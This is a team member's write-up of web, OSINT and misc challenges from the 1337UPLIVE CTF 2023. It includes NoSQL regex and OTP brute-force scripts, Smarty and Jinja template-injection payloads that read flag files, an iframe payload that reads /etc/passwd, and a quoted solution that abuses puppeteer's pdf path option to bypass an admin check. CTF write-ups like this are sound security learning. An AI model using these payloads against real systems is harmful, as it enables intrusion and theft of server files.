---
title: "1337UPLIVE CTF 2023"
description: "Writeup for web challenges in 1337UPLIVE CTF 2023"
summary: "Writeup for web challenges in 1337UPLIVE CTF 2023"
categories: ["Writeup"]
tags: ["Web Exploitation","OSINT","MISC", "CTF"]
#externalUrl: ""
date: 2023-11-20
draft: false
---

<!-- .slide: style="font-size: 12px;" -->


## Overview
I join with my team (**BKISC**) that participated in this CTF organized by **Intigriti** and got 2nd place 🥳🥳🥳.
![image](https://hackmd.io/_uploads/SkdTGMPEp.png)

## Writeup
### **1. CTFC**
- **Author:** Jopraveen
- **Caterogy:** Web
- **Description:** I'm excited to share my minimal CTF platform with you all, take a look! btw it's ImPAWSIBLE to solve all challenges 😺

![image](https://hackmd.io/_uploads/ryfoXGDEp.png)

**Solution:**
After register and login to homepage, I found 2 place that submit flag can be cracktation and another is base64 decode. But this is not the flag i need so i open burp and send request. 
![image](https://hackmd.io/_uploads/BJJljMPNa.png)
Idea:
> - Flag maybe in id challenge 3.
> - I don't know the flag but can brute it with **$regex**
> - The format flag is "INTIGRITI{}"

Final script:
```python!
import requests
import string

url = 'https://ctfc.ctf.intigriti.io/submit_flag'

flag = "INTIGRITI{"

headers = {
    'Cookie': 'session=eyJ1c2VyIjp7Il9pZCI6ImZkZDAwOGZmNmE0ZjQxN2JhOTI3ZTJiZTkyZWVjYzk5IiwidXNlcm5hbWUiOiJhIn19.ZVmVAQ.UxOlP1pYJWttIh4U-MQimuCwaDc',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Origin': 'https://ctfc.ctf.intigriti.io',
    'Referer': 'https://ctfc.ctf.intigriti.io/',
}

for i in string.ascii_letters + string.digits + "_{}*,.@#%&":
    json_payload = {
        "_id": "_id:3",
        "challenge_flag": {
            "$regex": f"^{flag+i}.*"
        }
    }
    response = requests.post(url, json=json_payload, headers=headers)
    if "correct flag!" in response.text:
        if i == '}':
            flag = flag+i
            print("Done, Here is your flag: "+flag)
            exit
        else:
            flag = flag+i
            print("A new character in flag: "+flag)
```
![image](https://hackmd.io/_uploads/HkJ79zDV6.png)
Flag: `INTIGRITI{h0w_1s_7h4t_PAWSIBLE}`

### **2. Bug Bank**
- **Author:** fhantke
- **Caterogy:** Web
- **Description:** Welcome to BugBank, the world's premier banking application for trading bugs! In this new era, bugs are more valuable than gold, and we have built the ultimate platform for you to handle your buggy assets. Trade enough bugs and you have the chance to become a premium member. And in case you have any questions, do not hesitate to contact your personal assistant. Happy trading! 😺
![image](https://hackmd.io/_uploads/SkK7nGv4a.png)

**Solution:**

This challenge just create 2 user accounts and the 1st one gives the negative bugs to another.
![image](https://hackmd.io/_uploads/BkJbpMw4a.png)

I already have 10000000 bugs to get the flag.

![image](https://hackmd.io/_uploads/ryUmpGPVp.png)

So just get the flag !!

![image](https://hackmd.io/_uploads/ryWHpMPET.png)

Flag: `INTIGRITI{h3y_wh0_541d_y0u_c0uld_cl0bb3r_7h3_d0m}`


### **3. Smarty Pants**
- **Author:** Protag
- **Caterogy:** Web
- **Description:** Since you're so smart then you should have no problem with this one 🤓
![image](https://hackmd.io/_uploads/H1BRANPE6.png)

**Review source code:**
```php!
<?php
if(isset($_GET['source'])){
    highlight_file(__FILE__);
    die();
}

require('/var/www/vendor/smarty/smarty/libs/Smarty.class.php');
$smarty = new Smarty();
$smarty->setTemplateDir('/tmp/smarty/templates');
$smarty->setCompileDir('/tmp/smarty/templates_c');
$smarty->setCacheDir('/tmp/smarty/cache');
$smarty->setConfigDir('/tmp/smarty/configs');

$pattern = '/(\b)(on\S+)(\s*)=|javascript|<(|\/|[^\/>][^>]+|\/[^>][^>]+)>|({+.*}+)/';

if(!isset($_POST['data'])){
    $smarty->assign('pattern', $pattern);
    $smarty->display('index.tpl');
    exit();
}

// returns true if data is malicious
function check_data($data){
    global $pattern;
    return preg_match($pattern,$data);
}

if(check_data($_POST['data'])){
    $smarty->assign('pattern', $pattern);
    $smarty->assign('error', 'Malicious Inputs Detected');
    $smarty->display('index.tpl');
    exit();
}

$tmpfname = tempnam("/tmp/smarty/templates", "FOO");
$handle = fopen($tmpfname, "w");
fwrite($handle, $_POST['data']);
fclose($handle);
$just_file = end(explode('/',$tmpfname));
$smarty->display($just_file);
unlink($tmpfname);
```

> - System writes the data to a temporary file, displays the template with the temporary file as the main content, and then deletes the temporary file. (This can exploit)
> - But first you need to bypass the regex to exploit it.

**Solution:**
After searching google i saw that smarty template can SSTI. But the first thing is bypass the regular expresstion.
Explain the regex (ChatGPT😆) or you can go to this [site](https://regexr.com):
1. `/(\b)(on\S+)(\s*)=/`: This part appears to be a regular expression for matching attributes in HTML or similar contexts that start with "on" followed by non-whitespace characters, followed by an equal sign. It uses capturing groups to capture word boundaries (\b), the "on" followed by non-whitespace characters (on\S+), and optional whitespace characters (\s*) before the equal sign.
2. `|`: The pipe symbol is used as an OR operator in regular expressions, allowing you to match multiple patterns.
3. javascript: This part is a literal string match for the word "javascript."
4. `<(|\/|[^\/>][^>]+|\/[^>][^>]+)>`: This part seems to be a regular expression for matching HTML tags. It includes alternatives for an empty tag (< followed by >), opening tags (<), closing tags (<\/), and tags with content (< followed by any characters that are not > or \/ followed by any characters that are not >).
5. `({+.*}+)`: This part appears to be a regular expression for matching content enclosed in curly braces. It uses capturing groups to capture one or more opening curly braces ({+), followed by any characters (.*), and one or more closing curly braces (}+).

The first thing i do is `{system('id')}` but the last regex will check it.
![image](https://hackmd.io/_uploads/S1c9pNw4a.png)
But what if i put `\n`? And yes this can bypass the regex.
![image](https://hackmd.io/_uploads/S1EATEw4T.png)
**Final payload:**
`{system('cat ../../../flag.txt')\n}`
![image](https://hackmd.io/_uploads/rJ2YCVDVa.png)
flag: `INTIGRITI{php_4nd_1ts_many_f00tgun5}`

### **4. Pizza Time**
- **Author:** kavigihan
- **Caterogy:** Web
- **Description:** It's pizza time!! 🍕

![image](https://hackmd.io/_uploads/SJ6FUSDE6.png)

**Solution:**

This chall i solve with luck 🤣. A little bit gacha to bypass using regex.
The thing that i try to SSTI but they block all the malicious input. So i put the regex `%0A` to bypass it randomly 🤣. And just read /flag.txt. 
Note: This challenge should RCE to get the flag but after guess where the flag and i find it (luck again).
Final payload: `customer_name=%0A{{get_flashed_messages.__globals__.__builtins__.open("/flag.txt").read()}}`
`&pizza_name=Margherita&pizza_size=Small&topping=Mushrooms&sauce=Marinara`
![image](https://hackmd.io/_uploads/rkAUvSwNp.png)
Flag: `INTIGRITI{d1d_50m3b0dy_54y_p1zz4_71m3}`

### **5. Photographs**
- **Author:** therealbrenu
- **Caterogy:** OSINT
- **Description:** Can you help us track down this photographer? 📸

![image](https://hackmd.io/_uploads/ByNe0rPV6.png)

The challenge said that I need to find the photographer of this image. To find it just use exiftool.
![image](https://hackmd.io/_uploads/B1o81UwET.png)
Then search the artist social network and I found his reddit [here](https://www.reddit.com/user/fl0pfl0p5/). After a little bit search all information about this artist, i see this.
![image](https://hackmd.io/_uploads/rkLEgUDE6.png)
This user said mine so i think this is the clone account of the artist. And yes, continue search his social and find this twitter [here](https://twitter.com/m4r64r1n3).
![image](https://hackmd.io/_uploads/Byy-Z8vV6.png)
Use Google lens to find something revelant with this picture and found it.
![image](https://hackmd.io/_uploads/r1eHf8vNT.png)
After i go to the blog i dont see the flag. But after fuzzing some tool to find it, I use wayback machine to get the flag.
![image](https://hackmd.io/_uploads/B1c_mIwE6.png)
Flag: `INTIGRITI{D3F1N173LY_N07_60TH4M_C17Y}`

### **6. Leeky Comics**
- **Author:** Dr Leek
- **Caterogy:** Misc
- **Description:** Check out Dr Leek's new comic store! 👨‍⚕️
![image](https://hackmd.io/_uploads/ByKKrLDEp.png)

This challenge so guessy and take me hours to solve this. 
**Solution:**
When see this challenge i thought we do something xss with html2canvas lol. But seeing this challenge is misc i give up that. And use **feroxbuster** to see another hidden path is /artist. 
![image](https://hackmd.io/_uploads/HkCB8IwNT.png)
When see it i remember my teammate found a password in the image using zsteg. `Mich3l@ngel0$ist1n3!511`
But i try to fuzzing the username. And then the author hint the username. 
![image](https://hackmd.io/_uploads/rkunu8w4p.png)
So guessy hmm. So the username and the password is done now. The last one is OTP(This OTP at the beginning they set it 3 digit pin and then the solution is 2 digit).

**Final exploit script:**
```python!
import requests
import re

url = 'https://leekycomics.ctf.intigriti.io/artist_login'

def clean_html(html):
    clean = re.compile("<.*?>")
    return re.sub(clean, '', html)
for i in range (10,100):
    data = {
        'username': 'Picasso',
        'password': 'Mich3l@ngel0$ist1n3!511',
        'otp': i
    }
    response = requests.post(url, data=data)
    res = clean_html(response.text)
    if "Incorrect login." in res:
        print("Login failed: Incorrect login in: " + str(i))
    else:
        print("Login successful in: " + str(i))
        print(response.text)
        exit
```
![image](https://hackmd.io/_uploads/ryzsc8D4p.png)

Flag: `INTIGRITI{5up3r_53cr37_fl46_dr_l33k_r0ck5}`

### **7. My Music (Not Solve)**
- **Author:** holmesec
- **Caterogy:** Web
- **Description:** Checkout my new platform for sharing the tunes of your life! 🎶

This challenge i just solve the first part. And also the idea in second part but fail here.
**Solution:**
![image](https://hackmd.io/_uploads/rykFJpwVa.png)
This challenge give me a spotify track code. And then they generate to PDF so i think this can be Server Side XSS (Cross Site Scripting). After trying some payload in PayloadsAllTheThings, i see this payload works.
`<iframe src="file:///etc/passwd" width="1000" height="1000"></iframe>`.
So this can LFI to get the file. The structure looks like this.
![image](https://hackmd.io/_uploads/BJEuQ6vNT.png)
**Review code:**
In the app/routes/index.js i found this.
```javascript!
router.get('/admin', isAdmin, (req, res) => {
 res.render('admin', { flag: process.env.FLAG || 'CTF{DUMMY}' })
})
```
So if I need to go to admin path and get the flag i need to bypass isAdmin fisrt. 
```javascript!
// app/middleware/check_admin.js
const { getUser, userExists } = require('../services/user')
const isAdmin = (req, res, next) => {
 let loginHash = req.cookies['login_hash']
 let userData
 if (loginHash && userExists(loginHash)) {
 userData = getUser(loginHash)
 } else {
 return res.redirect('/login')
 }
 try {
 userData = JSON.parse(userData)
 if (userData.isAdmin !== true) {
 res.status(403)
 res.send('Only admins can view this page')
 return
 }
 } catch (e) {
 console.log(e)
 }
 next()
}
module.exports = { isAdmin }
```

So we need to create a JSON file that set isAdmin = true to access the /admin. But the loginHash make me confuse after trying to Propotype Pollution in /app/utils/generateProfileCard.js.
```javascript!
const puppeteer = require('puppeteer')
const fs = require('fs')
const path = require('path')
const { v4: uuidv4 } = require('uuid')
const Handlebars = require('handlebars')
const generatePDF = async (userData, userOptions) => {
 let templateData = fs.readFileSync(
 path.join(__dirname, '../views/print_profile.handlebars'),
 {
 encoding: 'utf8',
 }
 )
 const template = Handlebars.compile(templateData)
 const html = template({ userData: userData })
 const filePath = path.join(__dirname, `../tmp/${uuidv4()}.html`)
 fs.writeFileSync(filePath, html)
 const browser = await puppeteer.launch({
 executablePath: '/usr/bin/google-chrome',
 args: ['--no-sandbox'],
 })
 const page = await browser.newPage()
 await page.goto(`file://${filePath}`, { waitUntil: 'networkidle0' })
 await page.emulateMediaType('screen')
 let options = {
 format: 'A5',
 }
 if (userOptions) {
 options = { ...options, ...userOptions }
 }
 const pdf = await page.pdf(options)
 fs.unlinkSync(filePath)
 return pdf
}
module.exports = { generatePDF }
```

There is the solution of the author:

```!
1. Find LFI via html injection in spotify code on `/profile`. Triggers when a profile card is generated ("Generate profile card" `profile/generate-profile-card`)
2. Initial exploration:
   1. Get idea of file structure by checking path: `<script>document.body.append(location.href)</script>`
   2. Check common files such as `index.js` and `app.js` (which is the right one in this case): `<iframe src="/opt/app/app.js" style="width: 999px; height: 999px"></iframe>`
   3. Explore routes: `<iframe src="/opt/app/routes/index.js" style="width: 999px; height: 999px"></iframe>`
3. Notice the `/admin` endpoint.
4. Check the `isAdmin` middleware: `<iframe src="/opt/app/middleware/check_admin.js" style="width: 999px; height: 999px"></iframe>`
5. Notice that the `catch` statement does not stop execution and that causing an error when parsing the `userData` object as JSON would skip the admin check.
6. Explore the user service to get an understanding of how users are stored: `<iframe src="/opt/app/services/user.js" style="width: 999px; height: 999px"></iframe>`
7. Notice users are stored as JSON files in the `data` folder.
8. In the `routes/index.js` file, notice the `userOptions` POST parameter.
9. Check the `generateProfileCard.js` file to see how it's used and how the profile card is generated: `<iframe src="/opt/app/utils/generateProfileCard.js" style="width: 999px; height: 999px"></iframe>`
10. Notice that the parameter is passed as options for the puppeteer `pdf` function.
11. After some research, discover the `path` parameter: https://pptr.dev/api/puppeteer.pdfoptions
12. Notice that the `path` parameter can be used to save the PDF in a specified location
13. Use the `path` parameter to overwrite your user's data object in the `data` folder with the contents of the PDF (which is invalid JSON)
14. Go to `/admin` to get the flag
```
So close!! I forgot about the pdfoptions of puppeteer. A new learn to get more experience about the security.
